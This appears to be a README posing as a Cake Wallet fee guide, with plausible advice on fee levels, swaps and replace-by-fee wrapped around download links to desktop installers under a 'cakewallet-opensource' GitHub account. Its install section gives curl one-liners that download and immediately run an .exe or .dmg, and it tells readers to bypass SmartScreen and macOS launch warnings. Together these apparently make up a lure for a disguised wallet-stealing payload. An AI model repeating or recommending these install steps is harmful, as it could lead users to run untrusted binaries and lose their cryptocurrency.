![Cake Wallet network fee guide](assets/cake-wallet-network-fee-article-banner.png)

# Set the Cake Wallet Network Fee Before You Send

What each fee level buys, and why a cheap send can look stuck.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Open the send screen, pick the fee level before you confirm, and send. A low fee is not cheaper in the end if the transaction waits hours; a confirmed transaction cannot be cancelled or reversed. If a send is already pending, raising the fee means replacing it where the chain allows, not editing the old one.

<!-- ARTICLE-BODY-BEGIN -->

## Install the current build
Fee handling is part of the wallet code, and an old build may not offer the same options or the same estimates. Install the current release over your existing one, keeping the wallet, then retry the send before you look for a deeper cause.

Download it from the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a> and let the wallet finish syncing first. Sending from a wallet that is still syncing produces its own errors that look like fee problems.

## Choosing a fee
The send screen offers fee levels: a cheap one for when time does not matter, a default, and a priority level for when it does. The number is a network fee paid to miners or validators, not a Cake Wallet charge, and it is deducted from the amount you send.

For Bitcoin, the fee depends on the size of the transaction in bytes, which is why sending from many small outputs costs more than one large output. <a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-coin-control.md">Coin control in Cake Wallet</a> explains how choosing inputs changes what you pay, and when consolidating makes sense.

## Why a send fails
A send that errors immediately usually has one of three causes: too little balance once the fee is included, no connection to a node, or a wallet that has not synced. None of those is a fee-level problem, and changing the fee will not fix them.

The exact message tells you which: an insufficient-funds error names the fee, an unreachable node shows as disconnected, and a stale balance means the wallet is still reading the chain. <a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-funds-not-appearing.md">Funds not appearing in Cake Wallet</a> covers the sync side, which is the cause people most often mistake for a lost transfer.

## Fees inside a swap
A swap charges twice: the provider's own fee inside the quote, and the network fee for the deposit you send to it. Sending your whole balance leaves nothing for the network leg, and the app refuses with a fee-cannot-be-zero message rather than sending a transaction that would fail.

Leave a small margin, or lower the fee level for the deposit if the provider is not in a hurry. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-swap-crypto.md">Swap crypto in Cake Wallet</a> explains how fixed and floating quotes interact with a slow deposit, which is where a cheap fee can cost you real money.

## Speed up or cancel
Once a transaction is broadcast and confirmed it cannot be cancelled. Before that, some chains allow a replacement that pays a higher fee, and the wallet can build one where the chain supports it; Bitcoin's replace-by-fee and a Monero transaction that is still unconfirmed are different cases.

Wait for confirmation rather than rebuilding a transaction blindly: sending again to the same address creates a second payment, not a faster first one. If a transaction stays unconfirmed for a long time, the receiver usually sees it as pending and will wait.

## FAQ
### Can I cancel a transaction?
No, once confirmed. Before confirmation, a replacement is possible only where the chain and the wallet support it.
### What does insufficient gas mean?
The network fee for that chain is higher than the balance available for it, usually because the token balance is separate from the gas balance.
### Why are Bitcoin fees high?
Fees follow network demand and your transaction's size. A transaction spending many small outputs is bigger and costs more.
### Why does the app say the fee cannot be zero?
You are sending the whole balance, leaving nothing for the fee. Leave a margin and retry.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[coin control in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-coin-control.md) · [swap crypto in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-swap-crypto.md) · [funds not appearing in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-funds-not-appearing.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
